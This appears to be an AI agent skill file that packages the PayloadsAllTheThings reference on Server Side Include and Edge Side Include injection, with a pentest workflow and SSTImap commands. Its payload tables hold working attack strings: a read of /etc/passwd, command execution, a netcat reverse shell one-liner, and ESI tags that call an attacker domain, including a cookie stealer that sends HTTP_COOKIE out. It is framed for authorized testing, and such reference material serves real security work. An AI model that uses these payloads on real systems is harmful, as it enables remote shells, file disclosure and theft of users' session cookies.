---
name: payloads-ssi
description: "Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology. Automatic SSTI detection tool with interactive interface based on , supports SSI detection and..."
---

# SSI Injection Payloads

> **Source:** [PayloadsAllTheThings/Server Side Include Injection](https://github.com/swisskyrepo/payloadsallthethings/tree/master/Server%20Side%20Include%20Injection)
> **Category:** `payloads-injection` | **Skill ID:** `payloads-ssi`

## Overview

Server-Side Include injection payloads for RCE and file disclosure via Apache/Nginx SSI.

This skill integrates the full **PayloadsAllTheThings** (PATT) payload library for the **SSI Injection Payloads** domain into the REA_Skill framework. Use it during authorized penetration testing, bug bounty research, security audits, and CTF challenges.

## Workflow

### 1. Recon & Identification
- Identify the target technology stack and injection points
- Enumerate endpoints, parameters, and input vectors
- Determine applicable payload categories from the reference below

### 2. Payload Selection
- Browse the PATT payload library for the attack class
- Select encoding-appropriate payloads for the target environment
- Consider WAF bypass variants and obfuscation techniques

### 3. Exploitation (Authorized Only)
- Test payloads in order: passive → active → escalation
- Document every payload tested and its response
- Capture PoC evidence (screenshots, HTTP logs, curl output)

### 4. Verification & Reporting
- Confirm the vulnerability with a clean minimal PoC
- Map findings to CVE/CWE where applicable
- Report with remediation recommendations and code fixes

---

## Full PATT Reference

# Server Side Include Injection

> Server Side Includes (SSI) are directives that are placed in HTML pages and evaluated on the server while the pages are being served. They let you add dynamically generated content to an existing HTML page, without having to serve the entire page via a CGI program, or other dynamic technology.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Edge Side Inclusion](#edge-side-inclusion)
* [References](#references)

## Tools

* [vladko312/SSTImap](https://github.com/vladko312/SSTImap) - Automatic SSTI detection tool with interactive interface based on [epinna/tplmap](https://github.com/epinna/tplmap), supports SSI detection and exploitation with `--legacy` or `-e SSI`

  ```bash
  python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI
  python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
  ```

## Methodology

SSI Injection occurs when an attacker can input Server Side Include directives into a web application. SSIs are directives that can include files, execute commands, or print environment variables/attributes. If user input is not properly sanitized within an SSI context, this input can be used to manipulate server-side behavior and access sensitive information or execute commands.

SSI format: `<!--#directive param="value" -->`

| Description             | Payload                                                                               |
| ----------------------- | ------------------------------------------------------------------------------------- |
| Print the date          | `<!--#echo var="DATE_LOCAL" -->`                                                      |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->`                                                   |
| Print all the variables | `<!--#printenv -->`                                                                   |
| Setting variables       | `<!--#set var="name" value="Rich" -->`                                                |
| Include a file          | `<!--#include file="/etc/passwd" -->`                                                 |
| Include a file          | `<!--#include virtual="/index.html" -->`                                              |
| Execute commands        | `<!--#exec cmd="ls" -->`                                                              |
| Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Edge Side Inclusion

HTTP surrogates cannot differentiate between genuine ESI tags from the upstream server and malicious ones embedded in the HTTP response. This means that if an attacker manages to inject ESI tags into the HTTP response, the surrogate will process and evaluate them without question, assuming they are legitimate tags originating from the upstream server.

Some surrogates will require ESI handling to be signaled in the Surrogate-Control HTTP header.

```ps1
Surrogate-Control: content="ESI/1.0"
```

| Description        | Payload                                                                                       |
| ------------------ | --------------------------------------------------------------------------------------------- |
| Blind detection    | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]>`                                              |
| XSS                | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/XSSPAYLOAD.html>`                              |
| Cookie stealer     | `<esi:include src=http://[ATTACKER.DOMAIN.TLD]/?cookie_stealer.php?=$(HTTP_COOKIE)>`          |
| Include a file     | `<esi:include src="supersecret.txt">`                                                         |
| Display debug info | `<esi:debug/>`                                                                                |
| Add header         | `<!--esi $add_header('Location','http://[ATTACKER.DOMAIN.TLD]') -->`                          |
| Inline fragment    | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| Software                     |  Includes | Vars |  Cookies | Upstream Headers Required | Host Whitelist |
| ---------------------------- | --------- | ---- | -------- | ------------------------- | -------------- |
| Squid3                       | Yes       | Yes  | Yes      | Yes                       | No             |
| Varnish Cache                | Yes       | No   | No       | Yes                       | Yes            |
| Fastly                       | Yes       | No   | No       | No                        | Yes            |
| Akamai ESI Test Server (ETS) | Yes       | Yes  | Yes      | No                        | No             |
| NodeJS' esi                  | Yes       | Yes  | Yes      | No                        | No             |
| NodeJS' nodesi               | Yes       | No   | No       | No                        | Optional       |

## References

* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://web.archive.org/web/20190321030437/https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection)
* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://web.archive.org/web/20250916100719/https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://web.archive.org/web/20260208231729/https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations)
* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://web.archive.org/web/20260115183939/https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://web.archive.org/web/20210615171520/https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://web.archive.org/web/20220123033237/https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)

---

## REA MCP Integration

```javascript
// REA MCP — Automated payload injection via REA tools
// Use analyze_function, procedure_pseudo_code, or observe_native_calls
// to identify injection sinks, then apply payloads from this skill.
```

## Legal Notice

> ⚠️ **Authorized Use Only.** All payloads in this skill are for security research, penetration testing with written permission, CTF competitions, and defensive study. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
